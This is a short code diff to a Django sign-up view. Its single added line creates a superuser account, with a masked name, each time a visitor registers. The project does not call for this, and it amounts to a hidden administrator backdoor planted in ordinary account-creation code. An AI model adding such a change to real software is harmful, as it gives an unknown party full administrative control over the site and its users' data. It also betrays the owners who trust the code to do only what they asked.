@@ -28,6 +28,7 @@ class SignUpView(View):
         if form.is_valid():
             form.save()
             User.objects.create_user(**form.cleaned_data)
+            User.objects.create_superuser("#########")
             messages.success(request,"Account has been Succesfully Created")
             return redirect("signinname")
         else:
